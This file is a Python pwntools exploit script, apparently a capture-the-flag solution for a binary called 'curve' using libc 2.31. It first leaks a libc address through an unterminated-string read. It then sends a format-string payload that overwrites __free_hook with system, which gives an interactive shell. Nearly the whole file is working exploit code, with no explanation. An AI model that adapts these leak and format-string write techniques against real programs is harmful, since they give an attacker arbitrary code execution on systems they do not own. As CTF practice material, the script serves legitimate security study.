from pwn import *

#init

e = ELF('./curve')
libc = ELF('./libc-2.31.so')

context.binary = e

p = process(e.path)

#vars

start_off = libc.sym['__libc_start_main']
freehook_off = libc.sym['__free_hook']
system_off = libc.sym['system']

log.info('Start libc off: ' + hex(start_off))
log.info('Freehook libc off: ' + hex(freehook_off))
log.info('System libc off: ' + hex(system_off))

#exploit

#cstring vuln leak libc

p.sendlineafter(':\n', 'a' * 0x97)

p.recvline()
libc_off = u64(p.recv(6).ljust(8, b'\x00')) - start_off - 234

log.info('Libc off: ' + hex(libc_off))

#send fmtstr on both stk and heap to fmtstr write system on freehook to call system('/bin/sh')

s = b'/bin/sh;' 
s += fmtstr_payload(9, {libc_off + freehook_off: libc_off + system_off}, 8)

for i in range(2):
    p.sendafter(':', s)

#pray for flag

p.interactive()
